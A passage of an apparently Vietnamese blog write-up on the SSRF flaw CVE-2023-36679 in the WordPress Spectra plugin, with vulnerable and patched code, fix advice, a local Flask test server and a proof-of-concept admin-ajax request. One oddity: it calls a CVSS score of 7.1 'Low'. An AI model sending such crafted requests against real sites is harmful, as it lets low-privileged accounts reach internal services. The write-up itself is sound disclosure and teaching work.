Gutenberg&lt;/strong&gt;) ảnh hưởng đến các phiên bản lên tới &lt;code&gt;2.6.6&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-36679&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-36679&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-addons-for-gutenberg/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Spectra Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Spectra&lt;/strong&gt;: &lt;strong&gt;2.6.6&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2.6.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $api_uri = ( isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản 2.6.6, hàm &lt;code&gt;template_importer()&lt;/code&gt; nhận tham số &lt;code&gt;api_uri&lt;/code&gt; trực tiếp từ biến &lt;code&gt;$_REQUEST&lt;/code&gt; và sử dụng giá trị này để gửi HTTP request thông qua hàm &lt;code&gt;wp_remote_get()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Do không có bước xác thực hoặc giới hạn nguồn, kẻ tấn công có thể cung cấp một URL tùy ý để ép máy chủ thực hiện request đến các địa chỉ nội bộ. Điều này tạo ra lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $block_id   = isset( $_REQUEST[&amp;#39;id&amp;#39;] ) ? absint( $_REQUEST[&amp;#39;id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $block_data = get_option( &amp;#39;ast-block-templates_data-&amp;#39; . $block_id );&#xA;    $api_uri = null !== $block_data ? $block_data-&amp;gt;{&amp;#39;astra-page-api-url&amp;#39;} : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã loại bỏ việc nhận URL trực tiếp từ người dùng. Thay vào đó, mã chỉ nhận &lt;strong&gt;ID của block&lt;/strong&gt; thông qua &lt;code&gt;$_REQUEST[&#39;id&#39;]&lt;/code&gt; và truy xuất URL tương ứng từ cơ sở dữ liệu (&lt;code&gt;wp_options&lt;/code&gt;) bằng khóa &lt;code&gt;ast-block-templates_data-{id}&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Nhờ đó, URL được giới hạn trong các bản ghi được quản lý sẵn trong hệ thống, loại bỏ khả năng người dùng tự cung cấp đường dẫn tùy ý. Cơ chế này giúp ngăn chặn hoàn toàn nguy cơ &lt;strong&gt;SSRF&lt;/strong&gt; và tăng tính an toàn khi gọi API từ phía máy chủ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; yêu cầu người dùng có đặc quyền từ &lt;strong&gt;Contributor&lt;/strong&gt; trở lên&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Xác thực nonce chống csrf với tên nonce là &lt;code&gt;_ajax_nonce&lt;/code&gt;, nếu nonce không khớp =&amp;gt; thoát khỏi logic và gửi lỗi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Lỗ hổng được công bố yêu cầu đặc quyền &lt;strong&gt;Contributor&lt;/strong&gt;, nên giá trị &lt;code&gt;_ajax_nonce&lt;/code&gt; rất có khả năng xuất hiện trong mã nguồn giao diện &lt;strong&gt;Admin&lt;/strong&gt;.&#xA;Với các lỗ hổng liên quan tới quyền Contributor thường gắn với chức năng tạo bài viết, bạn có thể tìm &lt;code&gt;_ajax_nonce&lt;/code&gt; bằng cách inspect phần tạo/sửa post trong trang quản trị (hoặc tìm trong script/HTML mà trang Admin sinh ra).&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#34; title=&#34;_ajax_nonce trong response&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;_ajax_nonce&lt;/h2&gt;&lt;p&gt;_ajax_nonce trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/nonce.png&#39; alt=&#34;_ajax_nonce&#34; height=&#34;708&#34; width=&#34;1533&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;_ajax_nonce trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Sau các bước xác thực, mã lấy trực tiếp giá trị &lt;code&gt;api_uri&lt;/code&gt; từ &lt;code&gt;$_REQUEST&lt;/code&gt;, gọi &lt;code&gt;esc_url_raw()&lt;/code&gt; rồi ghép tham số truy vấn và thực hiện cuộc gọi HTTP bằng &lt;code&gt;wp_remote_get()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$api_uri = isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;$request_params = array( &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39; );&#xA;$demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;$response = wp_remote_get( $demo_api_uri, $api_args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cuối cùng sẽ decode response và trả về dạng JSON với key &lt;code&gt;original_content&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;template_importer()&lt;/code&gt; được đăng ký làm callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_ast_block_templates_importer&amp;#39;, array( $this, &amp;#39;template_importer&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức, khi truy cập endpoint &lt;code&gt;/wp-admin/admin-ajax/php&lt;/code&gt; với &lt;code&gt;action=ast_block_templates_importer&lt;/code&gt; thì &lt;code&gt;template_importer()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;original_content&amp;#34;: &amp;#34;XNXX.COM&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo post và lấy &lt;code&gt;_ajax_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi request với &lt;code&gt;api_uri&lt;/code&gt; trỏ đến local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; bằng user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7Cf3dc677b2e483f598ad00a36fbd2f18ed1ed5015b39fc2df533aeb573a8dc3fd; wp-settings-time-2=1761027443; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761196421%7CqXmKZUf4pSlgQ1P9tEQA71pnVWLNanpuqdHLXAZXyFJ%7C1e8333233a2233576e988302d4f19d5c92470de4cc2bf4c1e31fb65788a44d35&#xA;&#xA;action=ast_block_templates_importer&amp;amp;_ajax_nonce=3ef4c6d6df&amp;amp;api_uri=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#34; title=&#34;Đọc nội dung từ local service&#34; data-thumbnail=&#34;/posts/2025-10-23-cve-2023-36679/result.png&#34; data-sub-html=&#34;&lt;h2&gt;result&lt;/h2&gt;&lt;p&gt;Đọc nội dung từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-23-cve-2023-36679/result.png&#39; alt=&#34;result&#34; height=&#34;523&#34; width=&#34;1524&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Đọc nội dung từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phiên bản &lt;code&gt;≤ 2.6.6&lt;/code&gt; của plugin &lt;code&gt;Spectra (Ultimate Addons for Gutenberg)&lt;/code&gt; tồn tại lỗ hổng SSRF do sử dụng &lt;code&gt;wp_remote_get()&lt;/code&gt; với URL do người dùng cung cấp mà không giới hạn hoặc xác thực nguồn.&#xA;Điều này cho phép tài khoản có quyền &lt;strong&gt;Contributor&lt;/strong&gt; gửi request từ máy chủ WordPress đến các địa chỉ nội bộ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không tin tưởng URL từ client, chỉ dùng dữ liệu có sẵn trên server.&lt;/li&gt;&#xA;&lt;li&gt;Ưu tiên dùng &lt;strong&gt;&lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; thay cho &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra phản hồi HTTP (status, MIME, nội 